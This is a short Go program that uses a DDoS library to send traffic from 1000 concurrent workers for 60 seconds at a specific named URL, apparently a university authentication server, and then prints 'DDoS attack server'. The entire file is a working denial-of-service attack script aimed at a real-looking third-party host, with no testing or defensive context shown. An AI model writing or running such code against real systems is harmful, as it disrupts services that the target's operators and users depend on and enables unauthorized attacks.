package main

import (
	"fmt"
	"time"

	ddos "github.com/Konstantin8105/DDoS"
)

func main() {
	workers := 1000
	d, err := ddos.New("https://gxu.authserver.cn:80/?rid=K43ijB6", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second * 60)
	d.Stop()
	fmt.Println("DDoS attack server: https://gxu.authserver.cn:80/?rid=K43ijB6")
	// Output: DDoS attack server: https://gxu.authserver.cn:80/?rid=K43ijB6
}
